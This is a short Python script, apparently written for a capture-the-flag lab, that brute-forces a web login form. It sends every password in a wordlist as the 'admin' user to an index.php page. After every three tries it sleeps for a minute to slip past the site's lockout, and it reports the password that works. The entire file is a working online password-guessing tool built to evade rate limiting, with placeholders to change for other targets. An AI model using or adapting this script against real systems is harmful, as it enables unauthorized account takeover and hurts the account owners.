import sys
import requests
import time
import re
count = 0
file = open("wordlist.txt") # change 
url = "http://10.10.60.120/index.php" # change


try:
	for f in file:
		if count==3: # test it and  change 
			count=0
			print("Sleeping!")
			time.sleep(60) # test it and change 
		print("Running!")
		passwd = f.strip()
		payload = {"username": "admin",
					"password":passwd,
					"submit":"Submit"}
		r = requests.post(url,data=payload)
		regOne = re.findall("Please enter valid login details",r.text) # test it and change 
		regTwo = re.findall("To many failed",r.text) # test it and change 
		count +=1
		if regOne != [] or regTwo != []:
			print ("Not Found!")
		else:
			print (f"Found --> {passwd}")
			print("Finished!")
			sys.exit(0)


except KeyboardInterrupt as kboard :
	sys.exit(0)




	
